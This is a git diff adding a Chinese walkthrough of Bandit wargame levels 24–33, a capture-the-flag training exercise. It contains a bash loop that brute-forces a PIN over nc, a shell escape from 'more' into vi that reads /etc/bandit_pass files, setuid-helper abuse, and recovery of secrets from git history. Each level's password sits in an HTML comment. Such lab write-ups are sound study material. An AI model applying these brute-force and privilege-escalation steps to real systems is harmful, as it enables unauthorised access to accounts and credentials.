@@ -267,3 +267,122 @@ cat pass
 ```
 查看密码，此处可能报错文件不存在，是因为脚本还未被运行，等待一分钟定时计划运行即可。
 <!-- 下一关用户名bandit24，密码：UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ-->
+
+# Level 24 → Level 25
+本关需要构造“上一关密码+空格+4位数密码”的字符串发送到本机30002端口，只有发送的内容正确才能得到回传的下一关密码，这一关的重点在于遍历所有4位数密码的可能性，然后逐一尝试发送，也就是进行暴力破解。一开始的思路是：
+```
+#! /bin/bash
+a=1000 #无法遍历前1000种可能，因为整数无法在前面补0
+while [ "$a" -lt 10000 ]; do
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ "$a | nc localhost 30002 >> 1.txt #将输出结果导出到文件中，最后从文件中读取数据，无需时刻观察
+	a=$(($a+1))
+done
+```
+这个方法的问题有两个，第一个就是无法遍历前1000种可能，而真正的密码可能就在其中；第二个就是等待时间过长，即使在nc中使用-w1来限制1秒的自动超时时间，完整遍历9000种可能性也需要150分钟，不加参数等待自动超时将更久。为此做了如下修改：
+```
+#!/bin/bash
+a="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+for i in {0..9}{0..9}{0..9}{0..9} #可以遍历所有10000种可能性
+do
+echo $a' '$i >> dic.txt #生成了一个密码字典
+done
+cat dic.txt | nc localhost 30002 >> 2.txt #通过遍历字典的方式能极大程度缩短时间
+tail -n 5 2.txt #发送正确的密码后会回传下一关密码并自动退出，因此查看输出结果最后几行内容即可
+```
+<!-- 下一关用户名bandit25，密码：uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG-->
+
+# Level 25 → Level 26
+下一关的用户bandit26的shell不是/bin/bash，直接通过ls发现目录下有一个ssh私钥，通过：
+```
+ssh bandit26@localhost -i bandit26.sshkey #参见Level13
+```
+会发现直接退出，查看一下bandit26的shell是什么：
+```
+cat /etc/passwd | grep "bandit26"
+```
+发现bandit26用户的shell是/usr/bin/showtext，通过cat看看这是什么，发现通过more命令运行了一个文本，运行完以后就通过exit0退出了。more命令的特性是如果一个页面显示不完整会中断，用户可自行翻页，与此同时按v即可进入vi模式，此时输入：
+```
+:r /etc/bandit_pass/bandit26 #vi模式下:r表示进入取代模式，成功运行后光标所在位置的字符会被取代，这里使用bandit26用户的密码来取代
+```
+即可显示bandit26用户的密码。关键点在于让more命令显示的文本无法完全显示，通过之前的登录失败界面可以发现more命令显示的文本（bandit26字符画）有6行，尝试将终端高度缩到6行即可成功中断。
+<!-- 下一关用户名bandit26，密码：5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z-->
+
+# Level 26 → Level 27
+首先和上一关一样中断more命令并进入vi模式，通过：
+```
+:set shell sh=/bin/sh #设置想要使用的shell
+:sh #进入当前shell
+ls -l#查看当前目录下的文件，发现有一个bandit27-do文件的suid为bandit27
+file bandit27-do #是一个可执行文件
+./bandit27-do cat /etc/bandit_pass/bandit27 #参见Level19
+```
+<!-- 下一关用户名bandit27，密码：3ba3118a22e93127a4ed485be72ef5ea-->
+
+# Level 27 → Level 28
+从本关起是git相关内容，使用bandit27用户登入后通过：
+```
+mkdir /tmp/110111
+cd /tmp/110111
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+```
+来克隆目标地址的内容即可，然后进入repo文件夹，查看README内容即可。
+<!-- 下一关用户名bandit28，密码：0ef186ac70e04ea33b4c1853d2526fa2-->
+
+# Level 28 → Level 29
+首先和上一关一样clone目标地址内容，进入repo文件夹后查看README.md的内容，发现密码未显示，通过：
+```
+git log
+```
+查看提交历史，发现add missing data这条commit比较可疑，查看修改记录：
+```
+git diff 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
+```
+发现被修改的下一关密码。
+<!-- 下一关用户名bandit29，密码：bbc96594b4e001778eee9975372716b2-->
+
+# Level 29 → Level 30
+首先和上一关一样clone目标地址内容，进入repo文件夹后查看README.md的内容，根据提示猜测密码可能不在这个分支，通过：
+```
+git branch -a #-a表示查看全部分支
+```
+查看全部分支，发现还存在dev和sploits-dev分支，切换到dev分支看看：
+```
+git checkout -b  dev origin/dev #新建一个dev分支，内容从origin/dev粘过来
+ls #发现目录下有READ.md和code文件夹
+cat READ.md #里面就有密码
+```
+<!-- 下一关用户名bandit30，密码：5b90576bedb2cc04c86a9e924ce42faf-->
+
+# Level 30 → Level 31
+首先和上一关一样clone目标地址内容，进入repo文件夹后查看README.md的内容，发现里面是空的，查看分支和历史也没有信息，通过：
+```
+git show-ref #显示本地存储库中可用的引用以及关联的提交ID
+```
+发现最后一行比较可疑，查看：
+```
+git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea
+```
+即可得到密码。
+<!-- 下一关用户名bandit31，密码：47e603bb428404d265f59c42920d81e5-->
+
+# Level 31 → Level 32
+首先和上一关一样clone目标地址内容，进入repo文件夹后查看README.md的内容，发现本关需要提交key.txt，内容为'May I come in?'，首先写入文件：
+```
+echo 'May I come in?' >> key.txt
+```
+通过ls -a会发现文件夹下有一个.gitignore文件，Git就会自动忽略这个文件里面提到的文件，查看内容发现是*.txt，意味着我们无法直接提交key.txt，所以移除后再提交：
+```
+git rm .gitignore
+git add key.txt
+git commit #之后会进入编辑器修改commit提交的信息，修改完内容后保存退出
+git push
+```
+即可看到返回内容里的密码。
+<!-- 下一关用户名bandit32，密码：56a9bf19c63d650ce78e6ec0354ee45e-->
+
+# Level 32 → Level 33
+进入之后发现不知道是在什么环境下，随便输入几个指令发现都被转换成了大写，直接输入$0获得shell，此时通过whoami发现我们已经是bandit33用户（通过ls -l可以发现脚本运行后权限为bandit33，原理同Level19），直接cat查看/etc/bandit_pass/bandit33就能获得密码。
+<!-- 下一关用户名bandit33，密码：c9c3199ddf4121b10cf581a98d51caee-->
+
+# Level 33 → Level 34
+暂时没有啦～
